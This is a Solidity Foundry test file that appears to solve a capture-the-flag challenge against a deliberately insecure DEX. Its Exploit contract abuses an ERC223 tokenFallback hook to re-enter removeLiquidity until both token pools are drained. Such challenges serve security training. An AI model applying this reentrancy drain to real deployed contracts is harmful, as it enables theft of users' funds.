// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

import {SimpleERC223Token} from "../src/tokens/tokenERC223.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";

import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract Challenge2Test is Test {
    InsecureDexLP target; 
    IERC20 token0;
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        
        token0 = IERC20(new InSecureumToken(10 ether));
        token1 = IERC20(new SimpleERC223Token(10 ether));
        
        target = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);
        target.addLiquidity(9 ether, 9 ether);

        token0.transfer(player, 1 ether);
        token1.transfer(player, 1 ether);
        vm.stopPrank();

        vm.label(address(target), "DEX");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "SimpleERC223Token");
    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/      

        //============================//
        Exploit exploit = new Exploit();
        
        exploit.setAll(address(token0), address(token1), target);

        token0.approve(address(exploit), 1 ether);
        token0.transfer(address(exploit), 1 ether);
        token1.approve(address(exploit), 1 ether);
        token1.transfer(address(exploit), 1 ether);
        
        exploit.hack();
        exploit.hack2();
        exploit.sendTo(player);

        vm.stopPrank();

        console.log(token1.balanceOf(player));
        console.log(token0.balanceOf(player));

        assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
        assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
        assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
        assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");

    }
}



/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/


contract Exploit {

    address public owner;
    uint public amount = 0;
    IERC20 public token0;
    IERC20 public token1;
    InsecureDexLP public dex;

  constructor() public payable {
    owner = msg.sender;  
  }

    function setAll(address zeroToken, address firstToken, InsecureDexLP dex1) public payable {
        token0 = IERC20(zeroToken); 
        token1 = IERC20(firstToken);
        dex = dex1;
    }

    function hack() external {  
        token0.approve(address(dex), 10 ether);
        token1.approve(address(dex), 10 ether);
        dex.addLiquidity(1 ether, 1 ether);
    }

    function hack2() external {  
        token0.approve(address(dex), 10 ether);
        token1.approve(address(dex), 10 ether);
        dex.removeLiquidity(1 ether);
    }

    function sendTo(address player) external {
        token0.approve(address(dex), 10 ether);
        token1.approve(address(dex), 10 ether);
        token0.transfer(owner, 10 ether);
        token1.transfer(owner, 10 ether);
    }

    function tokenFallback(address sender, uint256 value, bytes memory) external {

        if (sender == owner) {
            amount += value;
        } else {
            if (token1.balanceOf(address(this)) < 10 ether) {
                console.log("dex token 1 {}", token1.balanceOf(address(dex)));
                console.log("dex token 0 {}", token0.balanceOf(address(dex)));
                console.log("contract token 1 {}", token1.balanceOf(address(this)));
                console.log("contract token 0 {}", token0.balanceOf(address(this)));
                console.log("player token 1 {}", token1.balanceOf(owner));
                console.log("player token 0 {}", token0.balanceOf(owner));
                dex.removeLiquidity(1 ether);
            }
        }

    }
}